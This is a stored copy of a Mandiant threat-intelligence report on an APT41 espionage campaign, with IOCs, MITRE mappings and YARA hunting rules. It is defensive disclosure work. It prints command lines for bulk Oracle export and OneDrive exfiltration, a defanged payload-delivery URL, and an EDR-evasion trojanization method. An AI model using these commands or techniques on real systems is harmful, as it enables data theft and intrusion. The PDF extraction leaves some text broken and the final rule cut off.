{
    "id": "d53d43a2-c612-4007-90a0-5c02e006dcef",
    "created_at": "2024-07-26T02:06:24.710328Z",
    "updated_at": "2025-03-27T02:16:17.071575Z",
    "deleted_at": null,
    "sha1_hash": "afd353c869cde483bea099b7e62f5a1ca2d90245",
    "title": "APT41 Has Arisen From the DUST | Google Cloud Blog",
    "authors": "",
    "file_creation_date": "2024-07-25T14:20:04Z",
    "file_modification_date": "2024-07-25T14:20:04Z",
    "file_size": 602789,
    "plain_text": "Threat Intelligence\n\n# APT41 Has Arisen From the DUST\n\nJuly 19, 2024\n\n\n**Mandiant**\n\nWritten by: Mike Stokkel, Pierre Gerlings, Renato Fontana, Luis Rocha, Jared Wilson, Stephen Eckels,\n\nJonathan Lepore\n\n# Executive Summary\n\nIn collaboration with Google’s Threat Analysis Group (TAG), Mandiant has observed a sustained\n\ncampaign by the advanced persistent threat group APT41 targeting and successfully compromising\n\nmultiple organizations operating within the global shipping and logistics, media and entertainment,\n\ntechnology, and automotive sectors. The majority of organizations were operating in Italy, Spain,\n\nTaiwan, Thailand, Turkey, and the United Kingdom.\n\nAPT41 successfully infiltrated and maintained prolonged, unauthorized access to numerous victims'\n\nnetworks since 2023, enabling them to extract sensitive data over an extended period.\n\nAPT41 used a combination of ANTSWORD and BLUEBEAM web shells for the execution\n\n\n-----\n\nused publicly available tools SQLULDR2 for copying data from databases and PINEGROVE to\n\nexfiltrate data to Microsoft OneDrive.\n\n# Overview\n\nRecently, Mandiant became aware of an APT41 intrusion where the malicious actor deployed a\n\ncombination of ANTSWORD and BLUEBEAM web shells for persistence. These web shells were\n\nidentified on a Tomcat Apache Manager server and active since at least 2023. APT41 utilized these web\n\nshells to execute certutil.exe to download the DUSTPAN dropper to stealthily load BEACON.\n\nAs the APT41 intrusion progressed, the group escalated its tactics by deploying the DUSTTRAP\n\ndropper. Upon execution, DUSTTRAP would decrypt a malicious payload and execute it in memory,\n\nleaving minimal forensic traces. The decrypted payload was designed to establish communication\n\nchannels with either APT41-controlled infrastructure for command and control or, in some instances, with\n\na compromised Google Workspace account, further blending its malicious activities with legitimate\n\ntraffic. The affected Google Workspace accounts have been successfully remediated to prevent further\n\nunauthorized access.\n\nFurthermore, APT41 leveraged SQLULDR2 to export data from Oracle Databases, and used\n\nPINEGROVE to systematically and efficiently exfiltrate large volumes of sensitive data from the\n\ncompromised networks, transferring to OneDrive to enable exfiltration and subsequent analysis.\n\n\n-----\n\n_Figure 1: Attack path diagram of observed APT41 attack_\n\n# Victimology\n\n\n-----\n\nsectors that have been compromised by this campaign. The organizations impacted by this campaign\n\noriginated from a diverse range of countries spanning multiple continents, including:\n\nItaly\n\nSpain\n\nTaiwan\n\nThailand\n\nTurkey\n\nUnited Kingdom\n\nAn analysis of victim organizations within specific sectors reveals a notable geographic distribution.\n\nNearly all targeted organizations operating in the shipping and logistics sector were located in Europe\n\nand the Middle East, with a single exception. In contrast, all affected organizations within the media and\n\nentertainment sector were located in Asia.\n\nA significant portion of the victimized organizations within the shipping and logistics sector maintained\n\noperations across multiple continents, often as subsidiaries or affiliates of larger multinational\n\ncorporations operating within the same industry.\n\nMandiant has detected reconnaissance activity directed towards similar organizations operating within\n\nother countries such as Singapore. At the time of the publication, neither Mandiant nor Google TAG have\n\nany indicators of these organizations being compromised by APT41, but it could potentially indicate an\n\nexpanded scope of targeting.\n\n\n-----\n\n_Figure 2: Sectors impacted by APT41’s DUSTTRAP campaigns in 2024_\n\n\n-----\n\n# APT41\n\nAPT41 is a prolific cyber threat group that carries out Chinese state-sponsored espionage activity in\n\naddition to financially motivated activity that may be outside of state control. The group's financially\n\nmotivated intrusions have primarily targeted the video game industry, involving activities such as stealing\n\nsource code and digital certificates, manipulating virtual currencies, and attempting to deploy\n\nransomware. APT41 is unique among tracked China-based actors in that it utilizes non-public malware\n\ntypically reserved for espionage operations in activities that appear to fall outside the scope of state\nsponsored missions.\n\nThe group's espionage operations have targeted sectors such as healthcare, high-tech, and\n\ntelecommunications, and other areas of economic interest. APT41 has frequently used software supply\n\nchain compromises, where they inject malicious code into legitimate software updates. They also employ\n\nadvanced techniques like the use of bootkits and compromised digital certificates. The group's\n\nconsistent targeting of the video game industry for personal gain is believed to have contributed to the\n\ndevelopment of tactics later used in their espionage operations.\n\nFor additional information on APT41, refer to the following links:\n\n[Does This Look Infected? A Summary of APT41 Targeting U.S. State Governments](https://cloud.google.com/blog/topics/threat-intelligence/apt41-us-state-governments)\n\n[APT41: A Dual Espionage and Cyber Crime Operation](https://cloud.google.com/blog/topics/threat-intelligence/apt41-dual-espionage-and-cyber-crime-operation)\n\n# Threat Activity\n\n## DUSTPAN and BEACON\n\n\n-----\n\nDifferent variations of DUSTPAN may also load an external payload off disk from a hard-coded file path\n\nencrypted in the Portable Executable (PE) file. DUSTPAN may be configured to inject the decrypted\n\npayload into another process or create a new thread and execute it within its own process space.\n\nPreviously used by [APT41 in several 2021 and 2022 breaches, DUSTPAN resurfaced in a recent](https://cloud.google.com/blog/topics/threat-intelligence/apt41-us-state-governments)\n\ninvestigation. This time, APT41 disguised DUSTPAN as a Windows binary by executing the malicious file\n\nas w3wp.exe or conn.exe. Additionally, the DUSTPAN samples were made persistent via Windows\n\nservices; for example, one of the services was called Windows Defend .\n\nThe DUSTPAN samples were configured to load BEACON payloads into memory that were encrypted\n\nusing chacha20. The BEACON payloads, once executed, communicated using either self-managed\n\ninfrastructure hosted behind Cloudflare or utilized Cloudflare Workers as their command-and-control\n\n(C2) channels. BEACON configuration can be found in the Indicators of Compromise section.\n\n## DUSTTRAP\n\nDUSTTRAP is a multi-stage plugin framework with multiple components. DUSTTRAP begins with a\n\nlauncher (Stage 1) that AES-128-CFB decrypts an encrypted on-disk PE file <varies>.dll.mui and\n\nexecutes it in memory. Decryption relies on the target\n\nmachine's HKLM\\SOFTWARE\\Microsoft\\Cryptography\\MachineGUID, thereby keying the\n\nlauncher to the victim system. The decrypted PE from the launcher is a memory-only dropper (Stage 2)\n\nthat is responsible for decrypting an embedded configuration and two or more embedded plugin\n\ndynamic-link libraries (DLLs) from its .lrsrc section. Once executed, these DLLs begin the setup of\n\nthe modular plugin system. The first observed plugin (Stage 3) is responsible for low-level network setup\n\nand encryption. The second observed plugin (Stage 4) is responsible for higher-level network operations\n\nand may function as a downloader for additional plugins that, when loaded, may register themselves\n\nwith prior components in the execution chain for additional functionality. We've observed the second\n\nplugin to vary in functionality and more plugin variants likely exist.\n\n\n-----\n\nlarge .text section to hold the contents of each plugin. To trojanize the target DLL, the dropper will\n\ngenerate a new file on disk\n\nat %windir%\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Data.Trace\\\n\n\nv4.0_4.0.0.0__b0<hex_uuid>\\\n\n\n<original_module_name>.dll or %programdata%\\Microsoft.NET\\System.Data.Trace\\v4.0_4.0.0.0__b0<hex_uu\n\n<original_module_name>.dll . The malicious plugin code is only present in the .text section of\n\nthis file long enough to call ZwCreateSection, loading the trojanized malicious plugin code into\n\nmemory. Before the trojanized file is closed, the original contents of the .text section are restored on\n\ndisk. This is an evasion technique that will bypass endpoint detection and response (EDR) solutions that\n\nscan for malicious contents on file close. The malicious code may therefore not be present in the file\n\ndepending on when it was quarantined. During the trojanization process, the system time may be written\n\nto a log file at <filetime>.log and acquire the mutex ICMzUEkdLNayBdWF, though mutex names\n\nwill likely vary from host to host.\n\nThe following legitimate DLLs are blocklisted from being trojanized:\n\n\ncfgmgr32.dll\n\ncombase.dll\n\ncryptbase.dll\n\ncryptsp.dll\n\ndhcpcsvc.dll\n\ndhcpcsvc6.dll\n\ndnsapi.dll\n\nFWPUCLNT.DLL\n\ngdi32.dll\n\ngdi32full.dll\n\niertutil.dll\n\nimm32.dll\n\nIPHLPAPI.DLL\n\n\n-----\n\nKernelBase.dll\n\nlocale.nls\n\nmsvcp_win.dll\n\nmsvcrt.dll\n\nmswsock.dll\n\nNapiNSP.dll\n\nnlaapi.dll\n\nnsi.dll\n\nntdll.dll\n\nntmarta.dll\n\noleaut32.dll\n\nOnDemandConnRouteHelper.dll\n\npnrpnsp.dll\n\npowrprof.dll\n\nadvapi32.dll\n\napphelp.dll\n\nbcrypt.dll\n\nbcryptprimitives.dll\n\nprofapi.dll\n\nrasadhlp.dll\n\nrpcrt4.dll\n\nrsaenh.dll\n\nsechost.dll\n\nSHCore.dll\n\nshell32.dll\n\nshlwapi.dll\n\nsspicli.dll\n\nucrtbase.dll\n\nurlmon.dll\n\nuser32 dll\n\n\n-----\n\nwebio.dll\n\nwin32u.dll\n\nwindows.storage.dll\n\nwinhttp.dll\n\nwininet.dll\n\nwinnlsres.dll\n\nwinnsi.dll\n\nwinrnr.dll\n\nwinsta.dll\n\nws2_32.dll\n\nwshbth.dll\n\nWtsapi32.dll\n\n\nThe section objects created by the Stage 2 dropper for each trojanized plugin are appended to a linked\n\nlist in the droppers process and executed in memory. The dropper and each plugin perform a registration\n\nprocess with each other so that stages 2, 3, and 4 rely on each other and cooperatively call into and out\n\nof each other to handle the operation each is responsible for. Execution between all of these\n\ncomponents is accomplished via Windows fiber-based task event loop driven by Stage 2. Additional\n\nplugins may be registered and executed via this plugin framework.\n\nWe've observed at least 15 plugins with the higher-level themes of:\n\nShell Operations\n\nExecuting processes via cmd.exe\n\nFile System Operations\n\nDirectory enumeration\n\nChanging directory\n\nD l t fil\n\n\n-----\n\nCopy file\n\nMove file\n\nFile exists\n\nChange file timestamp\n\nList attached drives\n\nProcess Operations\n\nEnumerate running processes\n\nInject shellcode\n\nKill a process\n\nNetwork Probing\n\nPing a remote host\n\nAttempt connections on port\n\nNetwork Store Interface Operations\n\nGet network interface statistics\n\nScreen Operations\n\nGet screen size\n\nScreenshot\n\nSystem Information Survey\n\nList RDP sessions\n\nList installed security software\n\nGet system info\n\n\n-----\n\nGet system boot time\n\nEnumerate hidden and visible process windows\n\nFile Manipulation Operations\n\nOpen file\n\nWrite file\n\nCRC32 file content\n\nRead file\n\nClose file\n\nKeylogger\n\nActivate\n\nDelete log\n\nActive Directory Operations\n\nEnumerate domain controller information\n\nAdd user\n\nDelete user\n\nGet server configuration\n\nGet server shares\n\nGet detailed server and workstation domain information\n\nEnumerate servers\n\nGet list of services\n\nGet list of network shares\n\nAdd network share\n\n\n-----\n\nGet list of users\n\nSet user password\n\nFile Uploader\n\nUpload file resident on disk\n\nRDP\n\nEnumerate remote desktop sessions\n\nDNS Operations\n\nPerform DNS lookups\n\nDNS Cache Operations\n\nRetrieves DNS cache table operations\n\nRegistry Operations\n\nGet registry value\n\nDump registry path and children to disk\n\nSet registry value\n\nDelete registry value\n\n\n-----\n\n_Figure 3: Full execution flow of DUSTTRAP_\n\n## SQLULDR2\n\nSQLULDR2 is a command-line utility written in C/C++ that can be used to export the contents of a\n\nremote Oracle database to a local text-based file. There are multiple command-line parameters available\n\nto specify the details of the data export including but not limited to: query, user, rows, and text.\n\n\n-----\n\n<DATABASE> charset=utf8 safe=yes head=yes text=csv rows=50000000\n\nbatch=yes query=<SQL QUERY> file=<OUTPUT>.csv\n\n\n_Figure 4: Command line execution for SQLULDR2_\n\n## PINEGROVE\n\nDuring the intrusion, Mandiant observed APT41 leveraging PINEGROVE for their data exfiltration.\n\nPINEGROVE is a command-line uploader written in Go with functionality to collect and upload a file to\n\nOneDrive via the OneDrive API. PINEGROVE expects an authentication JSON file including relevant\n\nOneDrive credentials and the target file to upload.\n\n\nC:\\Programdata\\One.exe -c C:\\ProgramData\\auth.json -s <Filename>\n\n\n_Figure 5: Command line execution for PINEGROVE_\n\n[PINEGROVE is a publicly available tool and has been made available on Github.](https://github.com/MoeClub/OneList/tree/master/OneDriveUploader)\n\n## Code Signing Certificates\n\nThe DUSTTRAP malware and its associated components that were observed during the intrusion were\n\ncode signed with presumably stolen code signing certificates. One of the code signing certificates\n\nseemed to be related to a South Korean company operating in the gaming industry sector.\n\n\nSerial Number:\n\n6f:97:f1:3d:a5:5e:9f:70:a6:92:7e:d1:b3:3e:ee:ee\n\n\n-----\n\nIssuer: C = US, O = \"thawte, Inc.\", CN = thawte SHA256 Code Signing CA\n\nValidity\n\nNot Before: Feb 21 00:00:00 2019 GMT\n\nNot After : Apr 21 23:59:59 2022 GMT\n\nSubject: C = KR, ST = SEOUL, L = Gangnam-gu, O = CCR INC, OU = IT Team,\n\nCN = CCR INC\n\n\n_Figure 6: Code signing certificate abused by APT41_\n\n\nSerial Number:\n\n05:fa:8a:72:da:46:07:4f:de:1e:34:c7:46:61:ee:00\n\nSignature Algorithm: sha256WithRSAEncryption\n\nIssuer: C = US, O = DigiCert Inc, OU = www.digicert.com,\n\nCN = DigiCert SHA2 Assured ID Code Signing CA\n\nValidity\n\nNot Before: Jul 15 00:00:00 2020 GMT\n\nNot After : Aug 31 12:00:00 2022 GMT\n\nSubject: C = RU, L = Moscow, O = OOO ALEAN-TOUR, CN = OOO ALEAN-TOUR\n\n\n_Figure 7: Code signing certificate abused by APT41_\n\nAdditionally, Mandiant observed an additional DUSTTRAP sample on VirusTotal that was code signed\n\nwith a certificate from another South Korean gaming company. This same certificate was previously\n\nobserved by Mandiant in 2020 being used by UNC3914, which is suspected to be another Chinese\nnexus threat actor. Note that neither Mandiant nor TAG see any direct relation between UNC3914 and\n\nAPT41 at the time of writing.\n\n\nSerial Number:\n\n0a:2c:bf:9b:18:fe:1b:20:b9:4e:ca:c4:b0:78:b8:c1\n\n\n-----\n\nCN = DigiCert SHA2 Assured ID Code Signing CA\n\nValidity\n\nNot Before: Nov 12 00:00:00 2020 GMT\n\nNot After : Jan 17 23:59:59 2023 GMT\n\nSubject: C = KR, ST = Seoul, L = Gangnam-gu,\n\nO = Gala Lab Corp., CN = Gala Lab Corp.\n\n\n_Figure 8: Code signing certificate abused by APT41_\n\nThe use of the code signing certificate, as well as its suspected owners being companies in the gaming\n\nsector, aligns with APT41's tactics, techniques, and procedures (TTPs) and past campaigns. More\n\ndetails about this can be found in our [APT41 report.](https://services.google.com/fh/files/misc/apt41-a-dual-espionage-and-cyber-crime-operation.pdf)\n\n# Acknowledgement\n\nWe would like to thank Google’s TAG, our Incident Response consultants and FLARE who enabled this\n\nresearch. Additionally, we want to thank Mnemonic for reaching out to Mandiant to share their\n\nobservations.\n\n# MITRE ATT&CK\n\n|TACTIC|ID|Name|Description|\n|---|---|---|---|\n\n\nReconnaissance T15931.002 Search Open\nWebsites/Domains:\nSearch Engines\n\n\nAPT41 was observed using search engines\nin visiting victim's reachable servers.\n\n\n-----\n\nWebsites infrastructure that was externally reachable\nand observed in internet scan data.\n\n|Collection|T1560.001|Archive via Utility|APT41 was observed using rar to compress the data they downloaded from internal Oracle Databases.|\n|---|---|---|---|\n|Command and Control|T1071.001|Web Protocols|APT41 was observed using HTTPS for the communication as C2 for their malware.|\n|Exfiltration|T1567.002|Exfiltration to Cloud Storage|APT41 was observed using OneDrive for the exfiltration of staged data.|\n|Persistence|T1543.003|Create or Modify System Process: Windows Service|APT41 was observed creating a Windows Service to achieve persistency|\n|Persistence|T1574.001|DLL Search Order Hijacking|APT41 abused DLL search order hijacking to execute DUSTTRAP by using benign and malicious code-signed Windows binaries.|\n|Persistence|T1574.002|DLL Side-Loading|APT41 abused DLL sideloading to execute DUSTTRAP by using the AhnLab uninstaller.|\n|Defense Evasion|T1070.004|File Deletion|APT41 deleted files from the system after they were done using them. This was observed after APT41 created database dumps and exfiltrated the files.|\n|Defense Evasion|T1036.005|Match Legitimate Name or Location|APT41 used legitimate Windows names and locations to trojanize binaries|\n|Defense Evasion|T1027.013|Encrypted/Encoded File|APT41 leveraged AES-128-CFB for the encryption of the payloads that should be loaded by DUSTTRAP.|\n\n\n-----\n\nComponent: Web Shell drop and execute DUSTPAN.\n\nExecution T1569.002 Service Execution APT41 was observed using Windows\nservices to execute DUSTPAN binaries.\n\n# Indicators of Compromise\n\n[A GTI Collection is available for all the samples that are publicly available.](https://www.virustotal.com/gui/collection/199b57721e2e4c3c56b77ccbce9ecdc1d46d0018b84467fd52d80c29e10249f4)\n\n## Host-Based Indicators\n\n**Filename** **MD5** **Family**\n\nsqluldr.exe fcff642268898fcf65702a214aefbf9e SQLULDR2\n\nOneDriveUploader.exe ac125aea0b703de37980779599438b4a PINEGROVE\n\naclui.dll 17d0ada8f5610ff29f2e8eaf0e3bb578 DUSTPAN\n\ndbgeng.dll 9991ce9d2746313f505dbf0487337082 DUSTTRAP\n\ndbgeng.dll c33247bc3e7e8cb72133e47930e6ddad DUSTTRAP\n\nhostfxr.dll cfce85548436fb89a83bf34dc17f325d DUSTTRAP\n\ndbgeng.dll e98b9e21928252332edf934f3d18ac21 DUSTTRAP\n\n|Execution|T1569.002|Service Execution|APT41 was observed using Windows services to execute DUSTPAN binaries.|\n|---|---|---|---|\n\n|Filename|MD5|Family|\n|---|---|---|\n|sqluldr.exe|fcff642268898fcf65702a214aefbf9e|SQLULDR2|\n|OneDriveUploader.exe|ac125aea0b703de37980779599438b4a|PINEGROVE|\n|aclui.dll|17d0ada8f5610ff29f2e8eaf0e3bb578|DUSTPAN|\n|dbgeng.dll|9991ce9d2746313f505dbf0487337082|DUSTTRAP|\n|dbgeng.dll|c33247bc3e7e8cb72133e47930e6ddad|DUSTTRAP|\n|hostfxr.dll|cfce85548436fb89a83bf34dc17f325d|DUSTTRAP|\n\n\n-----\n\n|-|dc725f5e9b1ae062fbec86ee4d816b45|DUSTTRAP|\n|---|---|---|\n|Sbiedll.dll|d72f202c1d684c9a19f075290a60920f|DUSTTRAP|\n|atstrust.dll|393065ef9754e3f39b24b2d1051eab61|DUSTTRAP|\n|-|0e74285f3359393e57f5d49c156aca47|DUSTTRAP|\n|conn.exe|35f650c94faf6a2068e8238dd99edbea|DUSTPAN|\n|PrintWorkflowUserSvc_ a0c15f9d.dll / cbi.dll|3bb44c0dd7f424864d76d4df09538cb6|DUSTPAN|\n|dbgeng.dll|aca5c6daecf463012a09564764584937|DUSTTRAP|\n|-|336a0d6f8cc92bf9740ce17de600463b|DUSTTRAP|\n|-|6bc4a92ff4d2cfc9da91ae6a5d2ad3d5|DUSTTRAP|\n|-|a689e182fe33b9d564dddc35412ea0a7|DUSTTRAP|\n|-|e4a4aafb49b8c86a5ac087ae342c0ee6|DUSTTRAP|\n|-|e584119a4766e6cf49093c666965c8be|DUSTTRAP|\n|-|f1769ad5a9dc44794895275c656ed484|DUSTTRAP|\n\n\n## Network-Based Indicators\n\n\n-----\n\n|ns2[.]akacur[.]tk|BEACON|-|\n|---|---|---|\n|ns1[.]akacur[.]tk|BEACON|-|\n|orange-breeze- 66bb[.]tezsfsoikdvd[.]workers[.]dev|BEACON|-|\n|www[.]eloples[.]com|DUSTTRAP|First observed at 2024-02- 21 Last observed at 2024-07- 16|\n|95.164.16[.]231|-|Related to DUSTTRAP FQDN www[.]eloples[.]com|\n|152.89.244[.]185|-|Used to deliver DUSTPAN First activity observed at 2023-03-21|\n|hxxp://152.89.244[.]185/conn.exe|-|Used to deliver DUSTPAN First activity observed at 2023-03-21|\n\n\n# YARA and YARA-L Rules\n\n## YARA\n\n\n-----\n\n{\n\nmeta:\n\nauthor = \"Mandiant\"\n\ndescription = \"Rule looks for PEs signed using likely stolen\n\ncertificate issued for Gala Lab corp\"\n\ndisclaimer = \"This rule is meant for hunting and is not tested\n\nto run in a production environment.\"\n\nstrings:\n\n$org = \"Gala Lab Corp.\"\n\n$serial = { 0A 2C BF 9B 18 FE 1B 20 B9 4E CA C4 B0 78 B8 C1 }\n\ncondition:\n\n((uint16(0) == 0x5a4d and uint32(uint32(0x3C)) == 0x00004550)\n\nor (uint32(0) == 0xE011CFD0 and uint32(4) == 0xE11AB1A1))\n\nand #org > 1 and $serial\n\n}\n\n\nrule M_Hunting_Certificate_CCR_INC\n\n{\n\nmeta:\n\nauthor = \"Mandiant\"\n\ndescription = \"Rule looks for PEs signed using likely\n\nstolen certificate issued for CCR INC\"\n\ndisclaimer = \"This rule is meant for hunting and is not\n\ntested to run in a production environment.\"\n\nstrings:\n\n$org = \"CCR INC\"\n\n\n-----\n\ncondition:\n\n((uint16(0) == 0x5a4d and uint32(uint32(0x3C)) == 0x00004550) or\n\n(uint32(0) == 0xE011CFD0 and uint32(4) == 0xE11AB1A1)) and #org > 1\n\nand $serial\n\n}\n\n\nrule M_Hunting_Certificate_ALEAN_TOUR\n\n{\n\nmeta:\n\nauthor = \"Mandiant\"\n\ndescription = \"Rule looks for PEs signed using likely\n\nstolen certificate issued for ALEAN-TOUR\"\n\ndisclaimer = \"This rule is meant for hunting and is not\n\ntested to run in a production environment.\"\n\nstrings:\n\n$org = \"OOO ALEAN-TOUR\"\n\n$serial = { 05 FA 8A 72 DA 46 07 4F DE 1E 34 C7 46 61 EE 00 }\n\ncondition:\n\n((uint16(0) == 0x5a4d and uint32(uint32(0x3C)) == 0x00004550)\n\nor (uint32(0) == 0xE011CFD0 and uint32(4) == 0xE11AB1A1))\n\nand #org > 1 and $serial\n\n}\n\n\nrule M_Hunting_Uploader_PINEGROVE_1\n\n{\n\nmeta:\n\nth \"M di t\"\n\n\n-----\n\nmalware family.\"\n\ndisclaimer = \"This rule is meant for hunting and is not\n\ntested to run in a production environment.\"\n\nstrings:\n\n$s1 = \"Config: `%v`\" ascii\n\n$s2 = \"auth.json\" ascii\n\n$s3 = \"sp=%v%v%x\" ascii\n\n$s4 = \"Time: %v\" ascii\n\n$s5 = \"/me/drive/root\" ascii\n\n$s6 = \"OneDrive\" ascii fullword\n\n$s7 = \"microsoft.graph.driveItemUploadableProperties\" ascii\n\n$s8 = \"client_id=%v&client_secret=%v\" ascii\n\n$s9 = \"http://localhost/onedrive-login\" ascii\n\ncondition:\n\n(\n\n((uint32(0) == 0xcafebabe) or (uint32(0) == 0xfeedface) or\n\n(uint32(0) == 0xfeedfacf) or (uint32(0) == 0xbebafeca) or\n\n(uint32(0) == 0xcefaedfe) or (uint32(0) == 0xcffaedfe)) or\n\n(uint32(0) == 0x464c457f) or\n\n(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n\n) and\n\n(6 of them)\n\n}\n\n\nrule M_Hunting_Uploader_PINEGROVE_2\n\n{\n\nmeta:\n\n\n-----\n\nmalware family.\"\n\ndisclaimer = \"This rule is meant for hunting and is not\n\ntested to run in a production environment.\"\n\nstrings:\n\n$f1 = \"main.AllFiles\" ascii\n\n$f2 = \"main.Collect\" ascii\n\n$f3 = \"main.ConfigInit\" ascii\n\n$f4 = \"main.ConfigRead\" ascii\n\n$f5 = \"main.ConfigSave\" ascii\n\n$f6 = \"main.ConfigUpdate\" ascii\n\n$f7 = \"main.Exit\" ascii\n\n$f8 = \"main.FileRange\" ascii\n\n$f9 = \"main.FileReader\" ascii\n\n$f10 = \"main.FileStatus\" ascii\n\n$f11 = \"main.FormatRemoteFilePath\" ascii\n\n$f12 = \"main.GetFileName\" ascii\n\n$f13 = \"main.GetReomtePath\" ascii\n\n$f14 = \"main.Header\" ascii\n\n$f15 = \"main.init.0\" ascii\n\n$f16 = \"main.InitFile\" ascii\n\n$f17 = \"main.IsFolder\" ascii\n\n$f18 = \"main.main\" ascii\n\n$f19 = \"main.PreLoad\" ascii\n\n$f20 = \"main.Range2Int\" ascii\n\n$f21 = \"main.RemainTime\" ascii\n\n$f22 = \"main.SessionCreate\" ascii\n\n$f23 = \"main.ShowBar\" ascii\n\n$f24 = \"main.StringChecker\" ascii\n\n$f25 = \"main Task\" ascii\n\n\n-----\n\n$f27 = \"main.ThreadUpload\" ascii\n\n$f28 = \"main.Timer\" ascii\n\n$f29 = \"main.TimeUnix\" ascii\n\n$f30 = \"main.Upload\" ascii\n\n$f31 = \"main.Upload.func1\" ascii\n\n$f32 = \"main.Uploading\" ascii\n\n$version = \"go1.13.1\"\n\ncondition:\n\n(\n\n((uint32(0) == 0xcafebabe) or (uint32(0) == 0xfeedface) or\n\n(uint32(0) == 0xfeedfacf) or (uint32(0) == 0xbebafeca) or\n\n(uint32(0) == 0xcefaedfe) or (uint32(0) == 0xcffaedfe)) or\n\n(uint32(0) == 0x464c457f) or\n\n(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n\n) and\n\n$version and (25 of ($f*))\n\n}\n\n\nrule M_Hunting_Uploader_PINEGROVE_3\n\n{\n\nmeta:\n\nauthor = \"Mandiant\"\n\ndescription = \"Hunting for PINEGROVE uploader\n\nmalware family.\"\n\ndisclaimer = \"This rule is meant for hunting and is not\n\ntested to run in a production environment.\"\n\nstrings:\n\n\n-----\n\n$s3 = \"ThreadNum\"\n\n$s4 = \"BlockSize\"\n\n$s5 = \"SigleFile\"\n\n$s6 = \"MainLand\"\n\n$s7 = \"MSAccount\"\n\n$anchor1 = \"driveItemUploadableProperties\"\n\n$anchor2 = \"client_id\"\n\n$anchor3 = \"client_secret\"\n\n$anchor4 = \"onedrive-login\"\n\n$anchor5 = \"authorization_code\"\n\ncondition:\n\n(\n\n((uint32(0) == 0xcafebabe) or (uint32(0) == 0xfeedface) or\n\n(uint32(0) == 0xfeedfacf) or (uint32(0) == 0xbebafeca) or\n\n(uint32(0) == 0xcefaedfe) or (uint32(0) == 0xcffaedfe)) or\n\n(uint32(0) == 0x464c457f) or\n\n(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n\n) and\n\n(5 of ($s*)) and\n\n(4 of ($anchor*))\n\n}\n\n\nimport \"elf\"\n\nrule M_Hunting_Utility_Linux_SQLULDR2_1\n\n{\n\nmeta:\n\nauthor = \"Mandiant\"\n\ndescription = \"Detection of the Linux version of SQLULDR2.\"\n\n\n-----\n\nstrings:\n\n$name = \"sqluldr2zip.c\" ascii\n\n$out = \"uldrdata.%p.txt\" ascii\n\n$heading = \"SQL*UnLoader: Fast Oracle Text Unloader\" ascii\n\n$p1 = \"exec  = the command to execute the SQLs\" ascii\n\n$p2 = \"file  = output file name(default: uldrdata.txt)\" ascii\n\n$p3 = \"format = MYSQL: MySQL Insert SQLs, SQL: Insert SQLs\" ascii\n\n$p4 = \"text  = output type (MYSQL, CSV, MYSQLINS,\n\nORACLEINS, FORM, SEARCH)\" ascii\n\n$p5 = \"rows  = print progress for every given rows\n\n(default, 1000000)\" ascii\n\n$p6 = \"query  = select statement\" ascii\n\n$p7 = \"user  = username/password@tnsname\" ascii\n\ncondition:\n\n(uint32(0) == 0x464c457f) and\n\n$name and $out and $heading and (5 of ($p*)) and\n\nfor any i in (0 .. elf.symtab_entries):\n\n(elf.symtab[i].name == \"OCIServerAttach\") and\n\nfor any i in (0 .. elf.symtab_entries):\n\n(elf.symtab[i].name == \"OCISessionBegin\")\n\n}\n\n\nimport \"pe\"\n\nimport \"elf\"\n\nrule M_Hunting_Utility_SQLULDR2_1\n\n{\n\nmeta:\n\n\n-----\n\ndisclaimer = \"This rule is meant for hunting and is not\n\ntested to run in a production environment.\"\n\nstrings:\n\n$win_name = \"sqluldr2.exe\" ascii\n\n$elf_name = \"sqluldr2zip.c\" ascii\n\n$out = \"uldrdata.%p.txt\" ascii\n\n$heading = \"SQL*UnLoader: Fast Oracle Text Unloader\" ascii\n\n$p1 = \"exec  = the command to execute the SQLs\" ascii\n\n$p2 = \"file  = output file name(default: uldrdata.txt)\" ascii\n\n$p3 = \"format = MYSQL: MySQL Insert SQLs, SQL: Insert SQLs\" ascii\n\n$p4 = \"text  = output type (MYSQL, CSV, MYSQLINS,\n\nORACLEINS, FORM, SEARCH)\" ascii\n\n$p5 = \"rows  = print progress for every given rows\n\n(default, 1000000)\" ascii\n\n$p6 = \"query  = select statement\" ascii\n\n$p7 = \"user  = username/password@tnsname\" ascii\n\n$import = \"OCI.dll\" ascii\n\ncondition:\n\n(((uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and\n\npe.imports(\"OCI.dll\",\"OCIServerAttach\") and\n\npe.imports(\"OCI.dll\",\"OCISessionBegin\") and\n\n$import and $win_name and\n\nfor all of ($p*) : ( @ > @heading )) or\n\n((uint32(0) == 0x464c457f) and\n\n$elf_name and\n\nfor any i in (0 .. elf.symtab_entries):\n\n(elf.symtab[i].name == \"OCIServerAttach\") and\n\nfor any i in (0 elf symtab entries):\n\n\n-----\n\n$out and $heading and (5 of ($p*))\n\n}\n\n\nrule M_Hunting_Dropper_DUSTTRAP_1\n\n{\n\nmeta:\n\nauthor = \"Mandiant\"\n\ndescription = \"Detects the DUSTTRAP dropper (x64) based\n\non the use of CFG patching constants and argument construction\n\nfor payload entry-point\"\n\ndisclaimer = \"This rule is meant for hunting and is not\n\ntested to run in a production environment.\"\n\nstrings:\n\n$cfg_patch_constant_1 = { 48 FF E0 CC 90 }\n\n$cfg_patch_constant_2 = { 8B DA 48 8B F9 E8 }\n\n$cfg_patch_constant_3 = { B8 48 8B 00 00 66 39 02 }\n\n$cfg_patch_constant_4 = { 81 7A 07 48 8B D1 48 }\n\n$log_format = \"%lld.log\" wide\n\ncondition:\n\nuint16(0) == 0x5a4d and\n\nall of ($cfg_patch_constant_*) and\n\n$log_format\n\n}\n\n\nimport \"pe\"\n\n\n-----\n\nmeta:\n\nauthor = \"Mandiant\"\n\ndescription = \"Attempts to detect executables containing known\n\nDUSTPAN encryption keys within the .data section\"\n\ndisclaimer = \"This rule is meant for hunting and is not\n\ntested to run in a production environment.\"\n\nstrings:\n\n$key_1 = {3BCF741BF6411C087415BA340000004C8D05F28\n\nC0000488B4910E801F0FEFFB8}\n\n$key_2 = {C4498BD6488BCFE848A5000084C07564488BCFE\n\n8585C0000498B0F4C8B497045}\n\n$key_3 = {A24299055F1F0C14CBDD0B01DFA64C34F5FD033\n\nCA7F1AF30A0C75C57359D41E0}\n\ncondition:\n\nfilesize < 15MB and\n\nfor any i in (0..pe.number_of_sections - 1): (\n\npe.sections[i].name == 